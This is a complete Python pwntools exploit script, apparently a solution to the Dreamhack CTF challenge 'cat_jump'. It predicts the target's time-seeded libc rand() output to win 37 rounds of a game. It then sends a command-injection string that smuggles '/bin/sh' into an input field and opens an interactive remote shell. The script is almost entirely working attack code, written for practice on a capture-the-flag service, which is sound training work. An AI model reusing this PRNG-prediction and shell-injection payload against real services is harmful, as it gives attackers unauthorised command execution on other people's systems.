from pwn import *
from ctypes import CDLL
from ctypes.util import find_library

#p = process("./cat_jump")
p = remote("host3.dreamhack.games", 21743)

context.log_level = 'debug'

libc = CDLL(find_library('c'))
libc.srand(libc.time(0))

p.recvuntil(b"roof!")
sleep(3)

for i in range(37):
    rand = libc.rand() % 2
    
    if(rand == 0):
        p.sendlineafter(b"j': ", b"l")
    else:
        p.sendlineafter(b"j': ", b"h")
    libc.rand()

p.sendlineafter(b":", b"tttt\";/bin/sh;echo\"")

p.interactive()